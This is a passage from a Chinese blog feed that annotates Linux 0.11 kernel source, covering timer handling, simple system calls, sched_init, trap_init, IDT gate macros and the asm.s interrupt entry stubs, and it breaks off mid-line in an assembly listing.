class="line">p-&gt;next-&gt;jiffies = jiffies;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sti();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">long</span> cpl)</span><span class="comment">// 由 timer_interrupt 调用，参数时间中断前运行程序的 cpl</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> beepcount;<span class="comment">// 扬声器发声时间滴答数(定义在kernel/chr_drv/console.c)</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">sysbeepstop</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 关闭扬声器(同上)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (beepcount)<span class="comment">// 如果发声次数到，关闭发声</span></span><br><span class="line"><span class="keyword">if</span> (!--beepcount)</span><br><span class="line">sysbeepstop();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cpl)<span class="comment">// 如果 cpl = 0，内核程序运行时间增加</span></span><br><span class="line">current-&gt;utime++;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// 否则内核程序运行时间增加</span></span><br><span class="line">current-&gt;stime++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (next_timer) &#123;<span class="comment">// 如果有定时器存在</span></span><br><span class="line">next_timer-&gt;jiffies--;<span class="comment">// 将表头定时器值减一</span></span><br><span class="line"><span class="keyword">while</span> (next_timer &amp;&amp; next_timer-&gt;jiffies &lt;= <span class="number">0</span>) &#123;<span class="comment">// 如果已经等于 0</span></span><br><span class="line"><span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">fn = next_timer-&gt;fn;</span><br><span class="line">next_timer-&gt;fn = <span class="literal">NULL</span>;<span class="comment">// 处理程序的指针置空</span></span><br><span class="line">next_timer = next_timer-&gt;next;<span class="comment">// 表头指针向后指</span></span><br><span class="line">(fn)();<span class="comment">// 调用相应的处理程序</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (current_DOR &amp; <span class="number">0xf0</span>)<span class="comment">// 如果当前软盘控制器 FDC 的数字输出寄存器中马达启动位置位</span></span><br><span class="line">do_floppy_timer();<span class="comment">// 执行软盘定时程序</span></span><br><span class="line"><span class="keyword">if</span> ((--current-&gt;counter)&gt;<span class="number">0</span>) <span class="keyword">return</span>;<span class="comment">// 如果当前进程时间片没有用完，则返回</span></span><br><span class="line">current-&gt;counter=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!cpl) <span class="keyword">return</span>;<span class="comment">// 对于内核程序，直接返回（不依赖counter值调度）</span></span><br><span class="line">schedule();<span class="comment">// 对于用户程序，执行调度函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_alarm</span><span class="params">(<span class="keyword">long</span> seconds)</span><span class="comment">// 系统调用功能，设置报警定时器。参数单位是秒，所以需要单位转换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> old = current-&gt;alarm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old)</span><br><span class="line">old = (old - jiffies) / HZ;</span><br><span class="line"><span class="comment">// 将当前任务报警计时设置为 seconds 秒后的滴答数</span></span><br><span class="line">current-&gt;alarm = (seconds&gt;<span class="number">0</span>)?(jiffies+HZ*seconds):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> (old);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getpid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程号 PID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getppid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程父进程号 PPID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;father;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getuid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程用户号 UID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;uid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_geteuid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程有效用户号 EUID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;euid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getgid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程组号 GID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;gid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_getegid</span><span class="params">(<span class="keyword">void</span>)</span><span class="comment">// 系统调用功能，返回当前进程有效组号 EGID</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> current-&gt;egid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_nice</span><span class="params">(<span class="keyword">long</span> increment)</span><span class="comment">// 系统调用功能，调整进程对 CPU 的使用优先权</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;priority-increment&gt;<span class="number">0</span>)</span><br><span class="line">current-&gt;priority -= increment;<span class="comment">// 当 increment 为负数时，可以增加优先权</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是 main.c 中调用的 sched_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 385</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> * <span class="title">p</span>;</span><span class="comment">// 描述符表结构体指针</span></span><br><span class="line"><span class="comment">// sigaction 结构体长度必须为 16，保持对 POSIX 标准的兼容</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">sizeof</span>(struct sigaction) != <span class="number">16</span>)</span><br><span class="line">panic(<span class="string">&quot;Struct sigaction MUST be 16 bytes&quot;</span>);</span><br><span class="line"><span class="comment">// 设置初始任务的 TSS 与 LDT 描述符，宏定义在下面给出</span></span><br><span class="line">set_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;(init_task.task.tss));</span><br><span class="line">set_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;(init_task.task.ldt));</span><br><span class="line">p = gdt+<span class="number">2</span>+FIRST_TSS_ENTRY;<span class="comment">// p = &amp;gdt[6]，从 gdt 中第 6 项开始清空</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;NR_TASKS;i++) &#123;<span class="comment">// 初始任务的 TSS 与 LDT 描述符在 GDT 中的索引为 4 和 5</span></span><br><span class="line">task[i] = <span class="literal">NULL</span>;<span class="comment">// i 从 1 开始，不对初始任务做清空操作</span></span><br><span class="line">p-&gt;a=p-&gt;b=<span class="number">0</span>;<span class="comment">// 将任务 TSS 描述符清空</span></span><br><span class="line">p++;</span><br><span class="line">p-&gt;a=p-&gt;b=<span class="number">0</span>;<span class="comment">// 将任务 LDT 描述符清空</span></span><br><span class="line">p++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__asm__(<span class="string">&quot;pushfl ; andl $0xffffbfff,(%esp) ; popfl&quot;</span>);<span class="comment">// 复位 NT 标志位</span></span><br><span class="line">ltr(<span class="number">0</span>);<span class="comment">// 将任务 0 的 tss 描述符的选择子加载入 TR 任务寄存器，定义在 include/linux/sched.h</span></span><br><span class="line">lldt(<span class="number">0</span>);<span class="comment">// 将任务 0 的 LDT 描述符的选择子加载入 LDTR 任务寄存器</span></span><br><span class="line">outb_p(<span class="number">0x36</span>,<span class="number">0x43</span>);</span><br><span class="line">outb_p(LATCH &amp; <span class="number">0xff</span> , <span class="number">0x40</span>);</span><br><span class="line">outb(LATCH &gt;&gt; <span class="number">8</span> , <span class="number">0x40</span>);<span class="comment">// 初始化 8253 定时器，使其每 10 ms 发出一个 IRQ0 请求</span></span><br><span class="line">set_intr_gate(<span class="number">0x20</span>,&amp;timer_interrupt);<span class="comment">// 设置时钟中断门</span></span><br><span class="line">outb(inb_p(<span class="number">0x21</span>)&amp;~<span class="number">0x01</span>,<span class="number">0x21</span>);<span class="comment">// 允许定时器中断</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);<span class="comment">// 设置系统调用中断门</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// include/asm/system.h Line 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _set_tssldt_desc(n,addr,type) \<span class="comment">// 以 TSS 为例，n 为描述符项的地址，addr 为 TSS 所在的地址</span></span></span><br><span class="line">__asm__ (<span class="string">&quot;movw $104,%1\n\t&quot;</span> \<span class="comment">// 将 TSS 长度放入第 1-2 字节</span></span><br><span class="line"><span class="string">&quot;movw %%ax,%2\n\t&quot;</span> \<span class="comment">// 将 TSS 地址低 16 位放在 3-4 字节</span></span><br><span class="line"><span class="string">&quot;rorl $16,%%eax\n\t&quot;</span> \<span class="comment">// 将 TSS 地址高 16 位移至 ax 中</span></span><br><span class="line"><span class="string">&quot;movb %%al,%3\n\t&quot;</span> \<span class="comment">// 将 TSS 地址高 16 中的低字节放入第 5 字节</span></span><br><span class="line"><span class="string">&quot;movb $&quot;</span> type <span class="string">&quot;,%4\n\t&quot;</span> \<span class="comment">// 填充 type 字段</span></span><br><span class="line"><span class="string">&quot;movb $0x00,%5\n\t&quot;</span> \<span class="comment">// 第 7 字节为 0</span></span><br><span class="line"><span class="string">&quot;movb %%ah,%6\n\t&quot;</span> \<span class="comment">// 将 TSS 地址高 16 中的高字节放入第 8 字节</span></span><br><span class="line"><span class="string">&quot;rorl $16,%%eax&quot;</span> \<span class="comment">// 再次循环右移，恢复 eax 的值</span></span><br><span class="line">::<span class="string">&quot;a&quot;</span> (addr), <span class="string">&quot;m&quot;</span> (*(n)), <span class="string">&quot;m&quot;</span> (*(n+<span class="number">2</span>)), <span class="string">&quot;m&quot;</span> (*(n+<span class="number">4</span>)), \</span><br><span class="line"> <span class="string">&quot;m&quot;</span> (*(n+<span class="number">5</span>)), <span class="string">&quot;m&quot;</span> (*(n+<span class="number">6</span>)), <span class="string">&quot;m&quot;</span> (*(n+<span class="number">7</span>)) \</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_tss_desc(n,addr) _set_tssldt_desc(((char *) (n)),addr,<span class="meta-string">&quot;0x89&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_ldt_desc(n,addr) _set_tssldt_desc(((char *) (n)),addr,<span class="meta-string">&quot;0x82&quot;</span>)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--kernel（一）</title>
      <link href="/2020/03/27/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/27/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>上一篇文章说到 main.c 完成了所有的初始化并打开了登录 shell，现在就来具体分析每个初始化函数的实现细节。先整个 trap_init (main.c Line 128) 函数看看，该函数主要涉及 kernel 目录下的这些文件：</p><ul><li>asm.s</li><li>trap.c</li><li>system_call.s</li></ul><p>首先，trap_init 是定义在 trap.c 第 181 行的，该函数设置了各硬件异常的处理中断向量，set_trap_gate 与 set_system_gate 的区别在于前者设置的特权级为 0，后者为 3。因此由 set_system_gate 设置的 3，4，5 号陷阱门可以由任何程序调用。这两个函数的第一个参数是中断号，第二个参数是中断<strong>预处理</strong>程序的地址。trap_init 中涉及的中断处理程序除了 page_fault 定义在 mm/page.s 之外，其余都定义在 kernel 目录下的 asm.s 与 system_call.s 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// trap.c Line 181</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">set_trap_gate(<span class="number">0</span>,&amp;divide_error);<span class="comment">// 除数为 0 时产生</span></span><br><span class="line">set_trap_gate(<span class="number">1</span>,&amp;debug);<span class="comment">// 程序单步跟踪调试，EFLAGS 的 T 标志为 1 时产生该中断</span></span><br><span class="line">set_trap_gate(<span class="number">2</span>,&amp;nmi);<span class="comment">// 由不可屏蔽中断 NMI 产生</span></span><br><span class="line">set_system_gate(<span class="number">3</span>,&amp;int3);<span class="comment">// 断点指令 INT 3 产生，与 debug 处理相同</span></span><br><span class="line">set_system_gate(<span class="number">4</span>,&amp;overflow);<span class="comment">// OF 标志位引发</span></span><br><span class="line">set_system_gate(<span class="number">5</span>,&amp;bounds);<span class="comment">// 未通过地址边界检查引发</span></span><br><span class="line">set_trap_gate(<span class="number">6</span>,&amp;invalid_op);<span class="comment">// 无效指令的操作码(opcode)</span></span><br><span class="line">set_trap_gate(<span class="number">7</span>,&amp;device_not_available);<span class="comment">// 协处理器设备不存在</span></span><br><span class="line">set_trap_gate(<span class="number">8</span>,&amp;double_fault);<span class="comment">// 双中断出错</span></span><br><span class="line">set_trap_gate(<span class="number">9</span>,&amp;coprocessor_segment_overrun);<span class="comment">// 协处理器段超出</span></span><br><span class="line">set_trap_gate(<span class="number">10</span>,&amp;invalid_TSS);<span class="comment">// 无效 TSS 引发</span></span><br><span class="line">set_trap_gate(<span class="number">11</span>,&amp;segment_not_present);<span class="comment">// 选择子指示的段不存在</span></span><br><span class="line">set_trap_gate(<span class="number">12</span>,&amp;stack_segment);<span class="comment">// 堆栈段不存在或寻址超出堆栈段</span></span><br><span class="line">set_trap_gate(<span class="number">13</span>,&amp;general_protection);<span class="comment">// 未通过特权级保护检查引发</span></span><br><span class="line">set_trap_gate(<span class="number">14</span>,&amp;page_fault);<span class="comment">// 页错误</span></span><br><span class="line">set_trap_gate(<span class="number">15</span>,&amp;reserved);<span class="comment">// 保留</span></span><br><span class="line">set_trap_gate(<span class="number">16</span>,&amp;coprocessor_error);<span class="comment">// 协处理器发出 error 信号引发</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">17</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">set_trap_gate(i,&amp;reserved);<span class="comment">// 17 ~ 47 均先设置为保留</span></span><br><span class="line">set_trap_gate(<span class="number">45</span>,&amp;irq13);<span class="comment">// 协处理器中断</span></span><br><span class="line">outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);<span class="comment">// 允许 8259A 主片的 IRQ2 中断请求</span></span><br><span class="line">outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xdf</span>,<span class="number">0xA1</span>);<span class="comment">// 允许 8259A 从片的 IRQ13 中断请求</span></span><br><span class="line">set_trap_gate(<span class="number">39</span>,&amp;parallel_interrupt);<span class="comment">// 设置并行口 1 的中断向量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>set_trap_gate 与 set_system_gate 定义在 include/asm/system.h 中，它们都调用了 _set_gate 用于将中断描述符填入对应的 IDT 表项中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/asm/system.h Line 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _set_gate(gate_addr,type,dpl,addr) \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="meta-string">&quot;movw %%dx,%%ax\n\t&quot;</span> \<span class="comment">// ax = dx = 中断处理程序地址低 16 位</span></span></span><br><span class="line"><span class="string">&quot;movw %0,%%dx\n\t&quot;</span> \<span class="comment">// dx = 描述符高 4 字节的低 16 位</span></span><br><span class="line"><span class="string">&quot;movl %%eax,%1\n\t&quot;</span> \<span class="comment">// 此时 eax 为描述符低 4 字节，放入 IDT 表项低 4 字节</span></span><br><span class="line"><span class="string">&quot;movl %%edx,%2&quot;</span> \<span class="comment">// edx 为描述符高 4 字节，放入 IDT 表项高 4 字节</span></span><br><span class="line">: \</span><br><span class="line">: <span class="string">&quot;i&quot;</span> ((<span class="keyword">short</span>) (<span class="number">0x8000</span>+(dpl&lt;&lt;<span class="number">13</span>)+(type&lt;&lt;<span class="number">8</span>))), \<span class="comment">// 对应 %0，P 位为 1，DPL 与 TYPE 移到相应位</span></span><br><span class="line"><span class="string">&quot;o&quot;</span> (*((<span class="keyword">char</span> *) (gate_addr))), \<span class="comment">// 限定符 o 表示内存单元，%1 指的就是这个内存单元</span></span><br><span class="line"><span class="string">&quot;o&quot;</span> (*(<span class="number">4</span>+(<span class="keyword">char</span> *) (gate_addr))), \<span class="comment">// 这是 %2 对应的内存单元</span></span><br><span class="line"><span class="string">&quot;d&quot;</span> ((<span class="keyword">char</span> *) (addr)),<span class="string">&quot;a&quot;</span> (<span class="number">0x00080000</span>))<span class="comment">// edx = (char *)addr，eax = 0x00080000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_trap_gate(n,addr) \<span class="comment">// &amp;idt[n] 表示 IDT 第 n 项描述符的地址，15 表示陷阱门</span></span></span><br><span class="line">_set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">0</span>,addr)<span class="comment">// 0 表示特权级为 0，addr 为中断处理程序的地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_system_gate(n,addr) \</span></span><br><span class="line"><span class="meta">_set_gate(&amp;idt[n],15,3,addr)<span class="comment">// 这里特权级为 3</span></span></span><br></pre></td></tr></table></figure><p>以上是填写 IDT 中断描述符的过程，现在来看这些中断服务程序是怎么实现的，先看 asm.s。因为有的中断过程会产生错误号，故不产生错误号与产生错误号的中断过程预处理方式有一些区别，如图所示（上为高地址）：</p><p><img src="../img/a1.png" alt="有无错误号的栈"><br>以没有错误号为例，int 指令会将 ss esp eflags cs eip 依次压入栈中，然后预处理程序压入各寄存器保存现场，同时将真正的中断服务程序的地址赋给 eax，再将 0 压入栈中来占位，最后压入一个指向中断返回地址的指针</p><br><h2 id="asm-s"><a href="#asm-s" class="headerlink" title="asm.s"></a>asm.s</h2><p>以下为 asm.s 中无错误号的中断预处理程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">/* Line 14 */</span><br><span class="line">.globl divide_error,debug,nmi,int3,overflow,bounds,invalid_op</span><br><span class="line">.globl double_fault,coprocessor_segment_overrun</span><br><span class="line">.globl invalid_TSS,segment_not_present,stack_segment</span><br><span class="line">.globl general_protection,coprocessor_error,irq13,reserved/* 首先定义了这些全局标识符 */</span><br><span class="line"></span><br><span class="line">divide_error:/* 0 号中断 */</span><br><span class="line">pushl $do_divide_error/* 将实际处理 0 号中断的程序压栈 */</span><br><span class="line">no_error_code:/* 没有错误码的处理，这里以 divide_error 为例 */</span><br><span class="line">xchgl %eax,(%esp)/* xchg 交换两个操作数内容，即 eax = &amp;do_divide_error，eax 交换入栈 */</span><br><span class="line">pushl %ebx</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %edi</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %ebp</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs/* 保存现场 */</span><br><span class="line">pushl $0/* 错误码用 0 填充 */</span><br><span class="line">lea 44(%esp),%edx/* esp + 44 指向返回地址 */</span><br><span class="line">pushl %edx/* 将该指针压入栈中 */</span><br><span class="line">movl $0x10,%edx/* 加载内核数据段选择符至 ds，es，fs */</span><br><span class="line">mov %dx,%ds</span><br><span class="line">mov %dx,%es</span><br><span class="line">mov %dx,%fs</span><br><span class="line">call *%eax/* 调用 do_divide_error */</span><br><span class="line">addl $8,%esp/* 栈平衡 */</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">popl %ebp</span><br><span class="line">popl %esi</span><br><span class="line">popl %edi</span><br><span class="line">popl %edx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %ebx</span><br><span class="line">popl %eax/* 还原现场 */</span><br><span class="line">iret/* 中断返回 */</span><br><span class="line"></span><br><span class="line">debug:/* 1 号中断，处理方式与 3 号中断相同 */</span><br><span class="line">pushl $do_int3/* 同样先压处理函数 */</span><br><span class="line">jmp no_error_code/* 再跳到 no_error_code，以下同理 */</span><br><span class="line"></span><br><span class="line">nmi:/* 2 号中断 */</span><br><span class="line">pushl $do_nmi</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">int3:/* 3 号中断  */</span><br><span class="line">pushl $do_int3</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">overflow:/* 4 号中断  */</span><br><span class="line">pushl $do_overflow</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">bounds:/* 5 号中断  */</span><br><span class="line">pushl $do_bounds</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">invalid_op:/* 6 号中断  */</span><br><span class="line">pushl $do_invalid_op</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">coprocessor_segment_overrun:/* 9 号中断  */</span><br><span class="line">pushl $do_coprocessor_segment_overrun</span><br><span class="line">jmp no_error_code</span><br><span class="line"></span><br><span class="line">reserved:/* 15 号中断，同时也是其它保留中断的入口  */</span><br><span class="line">pushl $do_reserved</span><br><span class="line">jmp no_error_code</span><br></pre></td></tr></table></figure><p>然后是关于数学协处理器的硬件中断处理，coprocessor_error 定义在 system_call.s 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Line 85 */</span><br><span class="line">irq13:/* 45 号中断 */</span><br><span class="line">pushl %eax/* 保存 eax */</span><br><span class="line">xorb %al,%al</span><br><span class="line">outb %al,$0xF0</span><br><span class="line">movb $0x20,%al</span><br><span class="line">outb %al,$0x20/* 向 8259A 主片发送中断结束（EOI）信号 */</span><br><span class="line">jmp 1f</span><br><span class="line">1:jmp 1f</span><br><span class="line">1:outb %al,$0xA0/* 向 8259A 从片发送中断结束信号 */</span><br><span class="line">popl %eax/* 还原 eax 的值 */</span><br><span class="line">jmp coprocessor_error/* 在 system_call.s 中 */</span><br></pre></td></tr></table></figure><p>asm.s 最后部分是对于有错误号中断的处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">double_fault:/* 8 号中断 */</span><br><span class="line">pushl $do_double_fault</span><br><span class="line">error_code:</span><br><span class="line">xchgl %eax,4(%esp)/* eax = 错误号，eax 原值入栈 */</span><br><span class="line">xchgl %ebx,(%esp)/* ebx = 处理函数地址，ebx 原值入栈 */</span><br><span class="line">pushl %ecx</span><br><span class="line">pushl %edx</span><br><span class="line">pushl %edi</span><br><span class="line">pushl %esi</span><br><span class="line">pushl %ebp</span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">push %fs/* 保存现场 */</span><br><span class="line">pushl %eax/* 错误号 */</span><br><span class="line">lea 44(%esp),%eax/* esp + 44 指向中断返回地址 